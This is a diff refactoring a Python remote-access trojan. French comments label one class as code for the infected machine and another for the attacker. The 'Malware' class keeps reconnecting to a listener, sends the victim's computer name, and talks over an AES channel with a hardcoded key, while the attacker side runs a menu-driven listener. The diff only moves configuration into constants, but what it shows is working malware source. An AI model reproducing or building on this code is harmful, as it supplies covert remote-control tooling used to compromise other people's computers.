@@ -6,37 +6,29 @@ import subprocess
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 from base64 import b64encode, b64decode
-"""
-Classe contenant les variables communes entre client et serveur
-"""
 
-
-class Machine:
-    def __init__(self):
-        self.server_addr = ("localhost", 60000)
-        try:
-            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        except socket.error:
-            print("Socket cannot be created!")
-        self.language = "utf-8"
-        self.buffsize = 4096
-        self.key = b'AcVfgTjpKumnVftH'
-
+SERVER_ADDR = ("localhost", 60000)
+LANGUAGE = "utf-8"
+BUFFSIZE = 4096
+KEY = b'AcVfgTjpKumnVftH'
 
 """
 Classe contenant les fonctions pour la machine infectée
 """
 
 
-class Malware(Machine):
+class Malware:
     def __init__(self):
-        super().__init__()
+        try:
+            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except socket.error:
+            print("Socket cannot be created!")
 
     def start(self):
         time.sleep(2)
         try:
             print("try to co ....")
-            self.my_socket.connect(self.server_addr)
+            self.my_socket.connect(SERVER_ADDR)
             self.send(os.environ["COMPUTERNAME"])
         except socket.error:
             self.start()
@@ -44,19 +36,19 @@ class Malware(Machine):
             self.start()
 
     def send(self, message):
-        send_b = message.encode(self.language)
+        send_b = message.encode(LANGUAGE)
         iv = get_random_bytes(16)
-        cipher = AES.new(self.key, AES.MODE_CFB, iv)
+        cipher = AES.new(KEY, AES.MODE_CFB, iv)
         encrypted = b64encode(iv + cipher.encrypt(send_b))
         self.my_socket.send(encrypted)
 
     def receive(self):
         try:
-            enc = self.my_socket.recv(self.buffsize).decode(self.language)
+            enc = self.my_socket.recv(BUFFSIZE).decode(LANGUAGE)
             enc = b64decode(enc)
             iv = enc[:16]
-            cipher = AES.new(self.key, AES.MODE_CFB, iv)
-            return cipher.decrypt(enc[16:]).decode(self.language)
+            cipher = AES.new(KEY, AES.MODE_CFB, iv)
+            return cipher.decrypt(enc[16:]).decode(LANGUAGE)
         except ConnectionResetError:
             self.quit()
 
@@ -76,13 +68,16 @@ Classe contenant les fonction pour l'attaquant
 """
 
 
-class Client(Machine):
+class Client:
     def __init__(self):
-        super().__init__()
+        try:
+            self.my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        except socket.error:
+            print("Socket cannot be created!")
 
     def start(self):
         try:
-            self.my_socket.bind(self.server_addr)
+            self.my_socket.bind(SERVER_ADDR)
             self.my_socket.listen()
         except socket.error:
             print("Socket cant be binded!")
@@ -97,9 +92,9 @@ class Client(Machine):
 
     def send(self, command):
         try:
-            send_b = command.encode(self.language)
+            send_b = command.encode(LANGUAGE)
             iv = get_random_bytes(16)
-            cipher = AES.new(self.key, AES.MODE_CFB, iv)
+            cipher = AES.new(KEY, AES.MODE_CFB, iv)
             encrypted = b64encode(iv + cipher.encrypt(send_b))
             distant_socket.send(encrypted)
         except ConnectionResetError:
@@ -107,11 +102,11 @@ class Client(Machine):
             self.quit_error()
 
     def receive(self):
-        enc = distant_socket.recv(self.buffsize).decode(self.language)
+        enc = distant_socket.recv(BUFFSIZE).decode(LANGUAGE)
         enc = b64decode(enc)
         iv = enc[:16]
-        cipher = AES.new(self.key, AES.MODE_CFB, iv)
-        return cipher.decrypt(enc[16:]).decode(self.language)
+        cipher = AES.new(KEY, AES.MODE_CFB, iv)
+        return cipher.decrypt(enc[16:]).decode(LANGUAGE)
 
     def quit(self):
         print("Shutting down in 3 seconds")
@@ -189,4 +184,3 @@ class Client(Machine):
         print("Press 5 to return to the main menu")
         print("Press 0 to quit")
         return input()
-    
